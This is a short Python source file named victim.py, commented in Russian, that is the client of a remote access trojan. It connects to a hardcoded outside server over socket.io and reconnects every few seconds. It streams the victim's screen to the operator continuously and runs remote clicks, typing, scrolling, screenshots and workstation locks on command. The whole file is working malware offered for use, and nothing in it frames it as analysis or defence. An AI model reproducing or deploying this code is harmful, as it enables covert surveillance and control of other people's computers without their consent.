# victim.py - ПОДКЛЮЧАЕТСЯ ПО WEBSOCKET
import socketio
import time
import threading
import base64
import io
import pyautogui
from PIL import ImageGrab

DOMAIN = "https://ratkaapp.onrender.com"  # ТВОЙ ДОМЕН!

class Victim:
    def __init__(self):
        self.running = True
        self.sio = socketio.Client()
        
        @self.sio.event
        def connect():
            print('[+] Подключено!')
            self.sio.emit('victim_connect')
            threading.Thread(target=self.send_screen, daemon=True).start()
        
        @self.sio.event
        def command(data):
            self.execute_command(data.get('cmd'), data.get('val'))
        
        @self.sio.event
        def disconnect():
            print('[-] Отключено')
            self.running = False
        
        self.connect()
    
    def connect(self):
        while self.running:
            try:
                self.sio.connect(DOMAIN)
                self.sio.wait()
            except:
                print('[+] Переподключение...')
                time.sleep(5)
    
    def send_screen(self):
        while self.running and self.sio.connected:
            try:
                screenshot = ImageGrab.grab()
                width, height = screenshot.width // 2, screenshot.height // 2
                screenshot = screenshot.resize((width, height))
                buf = io.BytesIO()
                screenshot.save(buf, format='JPEG', quality=30)
                b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                self.sio.emit('victim_frame', b64)
                time.sleep(0.05)
            except:
                time.sleep(1)
    
    def execute_command(self, cmd, val):
        print(f'[CMD] {cmd} = {val}')
        try:
            if cmd == 'click':
                screen = ImageGrab.grab()
                x = int((val.get('x', 50) / 100) * screen.width)
                y = int((val.get('y', 50) / 100) * screen.height)
                pyautogui.click(x, y)
            elif cmd == 'scroll':
                pyautogui.scroll(120 if val.get('delta') == 'up' else -120)
            elif cmd == 'type':
                pyautogui.typewrite(val.get('text', ''))
            elif cmd == 'screenshot':
                ImageGrab.grab().save(f"screenshot_{int(time.time())}.png")
            elif cmd == 'lock':
                import ctypes
                ctypes.windll.user32.LockWorkStation()
            elif cmd == 'disconnect':
                self.running = False
        except Exception as e:
            print(f'[-] Ошибка {cmd}: {e}')

if __name__ == '__main__':
    victim = Victim()
